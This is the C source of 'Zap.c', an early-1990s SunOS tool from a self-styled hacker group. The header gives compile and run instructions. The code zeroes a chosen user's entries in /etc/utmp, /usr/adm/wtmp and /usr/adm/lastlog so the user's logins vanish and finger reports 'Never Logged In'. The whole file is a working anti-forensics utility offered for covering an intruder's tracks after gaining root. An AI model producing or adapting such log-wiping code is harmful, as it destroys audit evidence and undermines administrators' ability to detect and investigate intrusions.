
/*
      Title:  Zap.c (c) rokK Industries
   Sequence:  911204.B
 
    Syztems:  Kompiles on SunOS 4.+
       Note:  To mask yourself from lastlog and wtmp you need to be root,
              utmp is go+w on default SunOS, but is sometimes removed.
    Kompile:  cc -O Zap.c -o Zap
        Run:  Zap <Username>
 
       Desc:  Will Fill the Wtmp and Utmp Entries corresponding to the
              entered Username. It also Zeros out the last login data for
              the specific user, fingering that user will show 'Never Logged
              In'
 
      Usage:  If you cant find a usage for this, get a brain.
*/
 
#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <utmp.h>
#include <lastlog.h>
#include <pwd.h>

#define bzero(x, y) memset(x, 0, y)
 
int f;
 
void kill_tmp(name,who)
char *name,
     *who;
{
    struct utmp utmp_ent;
 
  if ((f=open(name,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
            }
     close(f);
  }
}
 
void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;
 
     if ((pwd=getpwnam(who))!=NULL) {
 
        if ((f=open("/usr/adm/lastlog", O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }
 
    } else printf("%s: ?\n",who);
}
 
main(argc,argv)
int  argc;
char *argv[];
{
    if (argc==2) {
        kill_tmp("/etc/utmp",argv[1]);
        kill_tmp("/usr/adm/wtmp",argv[1]);
        kill_lastlog(argv[1]);
        printf("Zap!\n");
    } else
    printf("Error.\n");
}
